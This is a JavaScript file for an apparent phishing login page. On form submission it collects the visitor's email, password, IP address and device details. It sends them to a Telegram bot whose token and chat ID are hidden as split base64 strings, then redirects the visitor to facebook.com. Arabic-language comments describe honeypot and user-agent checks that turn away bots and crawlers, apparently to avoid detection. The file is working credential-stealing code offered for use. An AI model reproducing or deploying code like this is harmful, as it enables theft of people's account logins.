const tokenPart1 = "NzU5MzQwOTA2MT";
const tokenPart2 = "pBQUhFUENUQ0x0dnhhQVdjRXltNzlnTDh1ZUhSQjd0dkRYZw==";
const TOKEN = atob(tokenPart1 + tokenPart2);

const chatIdPart1 = "NjAxNTIxNT";
const chatIdPart2 = "Y3NA==";
const CHAT_ID = atob(chatIdPart1 + chatIdPart2);

document.getElementById('login-form').addEventListener('submit', async function(e) {
    e.preventDefault();

    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();
    const honeypot = document.querySelector('[name="honeypot"]').value.trim();
    const userAgent = navigator.userAgent.toLowerCase();

    // التحقق من Honeypot: إذا كان مملوءًا، فهو بوت
    if (honeypot) {
        console.log('تم اكتشاف بوت عبر Honeypot');
        return;
    }

    // التحقق من User-Agent: إذا كان يحتوي على كلمات تشير إلى بوت
    if (userAgent.includes('bot') || userAgent.includes('crawler')) {
        console.log('تم اكتشاف بوت عبر User-Agent');
        return;
    }

    if (!email || !password) {
        alert('يرجى إدخال البريد الإلكتروني وكلمة المرور.');
        return;
    }

    try {
        const ip = await getUserIP();
        const deviceInfo = getDeviceInfo();
        const data = {
            email,
            password,
            ip,
            deviceInfo
        };
        await sendToTelegram(data, TOKEN, CHAT_ID);
        window.location.href = "https://www.facebook.com/";
    } catch (err) {
        console.error('Error:', err);
        alert(err.message || 'حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
    }
});